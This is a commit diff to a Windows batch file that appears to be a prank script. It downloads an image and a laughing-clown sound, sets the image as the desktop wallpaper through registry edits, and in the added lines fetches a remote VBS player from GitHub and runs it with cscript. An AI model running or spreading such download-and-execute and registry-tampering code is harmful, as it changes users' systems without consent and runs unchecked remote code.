f346db606aff7669a40b11d814191efa42350704
FGabi01 <46404350+FGabi01@users.noreply.github.com>
2020-03-25 01:16:36 +0100

    Update main.bat

--- main.bat
+++ main.bat
@@ -2,15 +2,8 @@
 powershell -Command "Invoke-WebRequest http://art-exlibris.net/images/large/exlibris_21693.jpg -OutFile %temp%\hatter.jpg"
 timeout 1
 powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/FearOffTheFart/Bash/master/clownlaugh.mp3 -OutFile %temp%\haha.mp3"
-set "%temp%\haha.mp3"
-( echo Set Sound = CreateObject("WMPlayer.OCX.7"^)
-  echo Sound.URL = "%file%"
-  echo Sound.Controls.play
-  echo do while Sound.currentmedia.duration = 0
-  echo wscript.sleep 100
-  echo loop
-  echo wscript.sleep (int(Sound.currentmedia.duration^)+1^)*1000) >sound.vbs
-start /min sound.vbs
+powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/FGabi01/BashHacks/master/player.vbs -OutFile %temp%\player.vbs"
+cscript %temp%\player.vbs
 reg add "HKEY_CURRENT_USER\control panel\desktop" /v wallpaper /t REG_SZ /d "" /f 
 reg add "HKEY_CURRENT_USER\control panel\desktop" /v wallpaper /t REG_SZ /f /d %temp%\hatter.jpg
 reg add "HKEY_CURRENT_USER\control panel\desktop" /v WallpaperStyle /t REG_SZ /d 2 /f
